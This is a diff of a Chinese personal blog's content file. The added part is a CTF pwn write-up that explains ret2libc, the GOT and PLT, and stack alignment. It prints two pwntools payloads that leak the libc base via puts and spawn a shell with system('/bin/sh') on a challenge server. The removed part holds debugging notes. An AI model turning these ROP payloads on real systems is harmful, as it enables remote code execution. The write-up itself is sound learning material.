-<h1 id="栈帧结构"><a href="#栈帧结构" class="headerlink" title="栈帧结构"></a>栈帧结构</h1><p>只描述方便我自己理解的 不一定标准</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">high</span><br><span class="line"> ↑</span><br><span class="line"> 	...</span><br><span class="line"> 	Return Addr</span><br><span class="line"> 	Caller&#x27;s rbp</span><br><span class="line"> 	(Callee&#x27;s Registers)</span><br><span class="line">	Buf(Local variables)</span><br><span class="line">	...</span><br><span class="line"> ↓</span><br><span class="line">low</span><br></pre></td></tr></table></figure>
+<p>vmmap查看一下各个段的权限:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/13/20240613-151130.png" alt="image-20240613151130505"></p>
+<p>没有可写可执行的段 所以思路转向<code>ret2libc</code> 题目没有给对应版本的.so库 所以测试的时候需要连上靶机获取环境</p>
+<p>ret2libc构造ROP的思路是用程序本身加载到虚拟内存空间中的libc函数来泄露libc在虚拟内存中的绝对基址 再通过基址获取到加载到虚拟内存中的<code>system()</code>和<code>b&#39;\bin\sh&#39;</code>来获取shell或者调用任意libc中的函数</p>
+<h3 id="GOT表和PLT表"><a href="#GOT表和PLT表" class="headerlink" title="GOT表和PLT表"></a>GOT表和PLT表</h3><p>GOT表记录了程序所使用的外部函数(libc中的函数)在虚拟内存中的绝对地址 只有在程序运行时才能获取每个函数具体的地址</p>
+<p>PLT表是由多段用于调用外部函数的代码块组成的 当程序调用其中一段时这段代码会从GOT中获取要调用的外部函数的地址并执行</p>
+<p>这个程序中可以先用<code>puts</code>来泄露自己的地址从而获取libc的基址 对64位程序要将puts的地址作为参数调用puts需要将GOT表中的puts地址存放在rdi中(<a href="https://wiki.osdev.org/System_V_ABI">Linux调用约定</a>)  要将栈上的内容赋值给寄存器就要寻找<code>pop rdi;ret</code>的gadget:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/13/20240613-153801.png" alt="image-20240613153801587"></p>
+<p>同时Ubuntu系统要求程序的栈平衡 ret指令的地址也会在payload中用到</p>
+<p>第一段获取libc基址的payload:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sh = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25928</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pading = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x58</span> - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = pading + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">leak = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_libc = u64(leak.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># print(hex(puts_libc))</span></span><br></pre></td></tr></table></figure>
 
-<p><code>call func</code>指令执行时会先将call指令的下一条指令push入栈 退出函数时保证堆栈平衡即rsp恢复到调用程序前一行的状态 函数结束前通过leave或直接<code>add rsp, xxx</code>来达到堆栈平衡</p>
-<h1 id="GEF常用指令"><a href="#GEF常用指令" class="headerlink" title="GEF常用指令"></a>GEF常用指令</h1><h2 id="telescope-dereference-register"><a href="#telescope-dereference-register" class="headerlink" title="telescope | dereference [register]"></a>telescope | dereference [register]</h2><p>递归地解引用某寄存器所含地址</p>
-<h2 id="pattern"><a href="#pattern" class="headerlink" title="pattern"></a>pattern</h2><h3 id="pattern-creat-lenth"><a href="#pattern-creat-lenth" class="headerlink" title="pattern creat [lenth]"></a>pattern creat [lenth]</h3><p>创建长度为lenth的负载 负载的形式可以搭配下一个指令进行栈溢出长度的计算</p>
-<h3 id="pattern-search-register"><a href="#pattern-search-register" class="headerlink" title="pattern search [register]"></a>pattern search [register]</h3><p>查找创建的负载中哪4&#x2F;8字节(根据程序的平台)与目标寄存器中的相同 以此可以通过传入<code>$rsp</code>计算栈溢出长度</p>
-<h1 id="IDA配合Pwntools进行动态调试"><a href="#IDA配合Pwntools进行动态调试" class="headerlink" title="IDA配合Pwntools进行动态调试"></a>IDA配合Pwntools进行动态调试</h1><p>因为正常IDA启动程序无法输入不可打印字符 所以需要配合pwntools发送数据 实现这个功能的具体步骤:</p>
-<p>1.用socat进行端口转发</p>
-<p><code>socat TCP-LISTEN:19961,reuseaddr,fork EXEC:./Program_to_debug,pty,raw,echo=0</code></p>
-<p>执行指令后<code>Program_to_debug</code>会立即启动并监听本机<code>19961</code>端口</p>
-<p>2.用pwntools附加到程序</p>
-<p>Python中导入pwn后使用<code>io = remote(&#39;127.0.0.1&#39;, 19961)</code>来建立和程序的链接 此时可以使用<code>io.send()</code>来发送数据</p>
-<p>3.用IDA附加到程序</p>
-<p><code>Debugger</code>选项卡中选择远端调试-&gt;附加到程序就能看到刚刚启用的的待调试程序:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-130646.png" alt="image-20240528130639443"></p>
-<p>注意事项:</p>
-<p>运行程序前要先在想要停下的地方下好断点 运行起来后IDA直接F9运行 一般在输入后下断点并在Python终端中向程序发送数据 发送完数据后程序就会断在刚刚下好的断点处</p>
-<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-131047.png" alt="image-20240528131047508"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-131106.png" alt="image-20240528131106868"></p>
+<p>第二段用于获取shell的payload:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_libc)</span><br><span class="line">libc_base = puts_libc - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2 = pading + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>由于Ubuntu≥18版本system函数中用到<code>movaps</code>指令要求栈0x10对其 所以需要保证system函数入口地址存放在原返回地址在栈中的位置的+0x10N bytes位置 用<code>ret</code>指令的地址来填充中间需要填充的位置即可</p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -2656,7 +2675,7 @@
     <title>GeekChallenge2023逆向方向wp</title>
     <url>/2024/02/22/GeekChallenge2023%E9%80%86%E5%90%91%E6%96%B9%E5%90%91wp/</url>
     <content><![CDATA[<p>参赛ID:1K0CT</p>
-<p>邮箱：<a href="mailto:&#111;&#x6b;&#x75;&#117;&#115;&#x75;&#107;&#117;&#x40;&#103;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#111;&#109;">&#111;&#x6b;&#x75;&#117;&#115;&#x75;&#107;&#117;&#x40;&#103;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#111;&#109;</a></p>
+<p>邮箱：<a href="mailto:&#x6f;&#107;&#117;&#x75;&#115;&#117;&#107;&#x75;&#x40;&#x67;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#x6f;&#107;&#117;&#x75;&#115;&#117;&#107;&#x75;&#x40;&#x67;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;</a></p>
 <span id="more"></span>
 
 <h3 id="Shift-jmp-简单花指令"><a href="#Shift-jmp-简单花指令" class="headerlink" title="Shift_jmp | 简单花指令"></a>Shift_jmp | 简单花指令</h3><p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011221.png" alt="image-20240223003954050"></p>
